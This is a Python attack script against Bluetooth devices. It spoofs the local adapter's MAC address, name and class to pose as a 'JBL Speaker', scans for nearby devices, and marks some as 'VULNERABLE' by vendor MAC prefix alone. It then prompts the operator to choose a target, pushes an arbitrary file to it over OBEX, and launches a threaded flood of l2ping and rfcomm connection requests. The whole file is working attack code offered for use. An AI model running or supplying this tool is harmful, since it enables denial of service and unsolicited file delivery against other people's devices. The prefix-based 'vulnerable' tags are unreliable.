#!/usr/bin/env python3

import os
import time
import threading
import bluetooth

# =============== CONFIGURATION ===============
OBEX_FILE = "payload.txt"  # Replace with any file you want to send
SPOOF_MAC = "00:11:22:33:44:55"
SPOOF_NAME = "JBL Speaker"
SPOOF_CLASS = "0x200404"

VULN_VENDORS = {
    "44:65:0D": "Xiaomi",
    "B8:27:EB": "Raspberry Pi",
    "00:11:22": "JBL"
}

# =============== STEP 0: SPOOF DEVICE ===============
def spoof_identity():
    print("[*] Spoofing Bluetooth MAC, name and class...")
    os.system("hciconfig hci0 down")
    os.system(f"bdaddr -i hci0 {SPOOF_MAC}")
    os.system(f"hciconfig hci0 name \"{SPOOF_NAME}\"")
    os.system(f"hciconfig hci0 class {SPOOF_CLASS}")
    os.system("hciconfig hci0 up")

# =============== STEP 1: SCAN & FINGERPRINT ===============
def scan_devices():
    print("[*] Scanning for Bluetooth devices (10 seconds)...")
    nearby_devices = bluetooth.discover_devices(duration=10, lookup_names=True)

    if not nearby_devices:
        print("[-] No devices found. Exiting.")
        exit(0)

    print("\n[+] Devices found:")
    for idx, (addr, name) in enumerate(nearby_devices):
        vendor = match_vendor(addr)
        tag = f" [VULNERABLE: {vendor}]" if vendor else ""
        print(f"  [{idx}] {name} - {addr}{tag}")

    return nearby_devices

def match_vendor(mac):
    prefix = mac.upper()[:8]
    for known_prefix in VULN_VENDORS:
        if prefix.startswith(known_prefix):
            return VULN_VENDORS[known_prefix]
    return None

# =============== STEP 2: TARGET SELECTION ===============
def select_target(devices):
    choice = int(input("\nSelect device number to attack: "))
    if 0 <= choice < len(devices):
        return devices[choice]
    else:
        print("[-] Invalid choice.")
        exit(0)

# =============== STEP 3: ATTACK FUNCTIONS ===============
def l2ping_flood(mac):
    while True:
        os.system(f"l2ping -c 1 -s 600 {mac} > /dev/null 2>&1")

def connect_flood(mac):
    while True:
        os.system(f"rfcomm connect hci0 {mac} 1 > /dev/null 2>&1")

def obex_push(mac):
    print(f"[+] Sending file '{OBEX_FILE}' via OBEX Push...")
    os.system(f"obexftp --nopath --noconn --uuid none --bluetooth {mac} --channel 10 -p {OBEX_FILE}")

def ddos(mac):
    print(f"[!] Launching Bluetooth DDoS on {mac}...")
    threads = []
    for _ in range(3):
        t1 = threading.Thread(target=l2ping_flood, args=(mac,))
        t2 = threading.Thread(target=connect_flood, args=(mac,))
        threads.extend([t1, t2])
    for t in threads:
        t.daemon = True
        t.start()

# =============== STEP 4: MAIN ===============
def main():
    os.system("rfkill unblock bluetooth")
    spoof_identity()

    devices = scan_devices()
    target_name, target_mac = select_target(devices)
    print(f"\n[*] Target selected: {target_name} ({target_mac})")

    obex_push(target_mac)
    ddos(target_mac)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[+] Stopping attack and disconnecting...")
        os.system("rfcomm release all")

if __name__ == "__main__":
    main()
